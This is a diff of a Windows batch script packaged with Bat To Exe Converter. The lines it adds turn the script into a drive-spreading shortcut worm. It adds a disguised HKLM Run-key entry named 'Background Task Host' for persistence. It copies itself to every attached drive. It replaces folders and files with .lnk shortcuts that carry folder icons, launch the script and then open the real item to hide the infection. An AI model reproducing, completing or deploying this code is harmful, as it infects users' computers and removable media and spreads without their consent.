@@ -1,6 +1,6 @@
 ::[Bat To Exe Converter]
 ::
-::fBE1pAF6MU+EWH3eyBJjZltiQAWGfEKsB7sT/tSruaTHjVkVUfADSJ3U0LGNNPMv6ETnfpE/2W9UnP8NHxBwcQG/IAosrC4P9kWLI86quh30WQW+6Vk9J3Z8iHHEjz4vLtZwn6M=
+::fBE1pAF6MU+EWH3eyBJjZltiQAWGfEKsB7sT/tSruaTHjVkVUfADSJ3U0LGNNPMv0WLtYb441DpondsDHxJMcQCiaxwJlWxDtW+CJciJvQvVS1uCzkQjDytxn2bsnyM0csdrj9dN1ji7nA==
 ::YAwzoRdxOk+EWAnk
 ::fBw5plQjdG8=
 ::YAwzuBVtJxjWCl3EqQJgSA==
@@ -27,8 +27,8 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCuDJAnXugIGJBpQDC2UPWW1EIlMvqa7wP6Pp18hZPAwcorYzqeyIuEQ4UL2eoMj0k5bi8AkAwhMMBeza0956U9Mom2zPtWJoELWRVqE2kkxGG5zlWzFgi8PYcBjsswQx2675Eif
-::YB416Ek+ZW8=
+::Zh4grVQjdCuDJAnXugIGJBpQDC2UPWW1EIlMvqa7wP6Pp18hZPAwcorYzqeyG8ca/m3xd9Yf02pVi8IYAwlRewGWUg01qmVFpGuQOcOoshzqYkea8gU1A2BIhWLThywpb8ZmnvcCwCuW817r0aAI1Bg=
+::YB416Ek+ZG8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
@@ -37,33 +37,45 @@ chcp 65001>nul
 
 
 
+rem if "%runKey%" == "already_runned" exit
+rem set runKey=already_runned
+
+echo.%*
+pause
+if "%*" NEQ "" start "%*" explorer "%*"
+
+
+
 :cycle
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host" /d "%SystemDrive%\%~nx0" /f
+
 for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-  if "%%i:" NEQ "%SystemDrive%" (
-    if exist "%%i:\" (
-      if exist "%%i:\%~nx0" (
-        rem attrib +s +h "%%i:\%~nx0"
-        rem reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - Drive %%i:" /d "%%i:\%~nx0" /f
+  if exist "%%i:\" (
+    if exist "%%i:\%~nx0" (
+      rem attrib +s +h "%%i:\%~nx0"
+
+      if "%%i:" NEQ "%SystemDrive%" if "%%i" NEQ "D" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
           if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
             rem attrib +h "%%i:\%%x"
             if not exist "%%i:\%%x.lnk" (
-              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%%x"
-              >nul timeout /nobreak /t 1
+              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
+              rem >nul timeout /nobreak /t 1
             )
           )
         )
+
         for /f "delims=" %%x in ('dir "%%i:\*" /a:-d /b 2^>nul') do (
-          if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
+          if "%%x" NEQ "desktop.ini" if "%%x" NEQ "pagefile.sys" if "%%x" NEQ "Thumbs.db" (
             rem attrib +h "%%i:\%%x"
-            if not exist "%%i:\%%x.lnk" (
-              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%%x"
-              >nul timeout /nobreak /t 1
+            if not exist "%%i:\%%x" (
+              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
+              rem >nul timeout /nobreak /t 1
             )
           )
         )
-      ) else rem copy /y "%~dpnx0" %%i:\
-    )
+      )
+    ) else copy /y "%~dpnx0" %%i:\
   )
 )
 
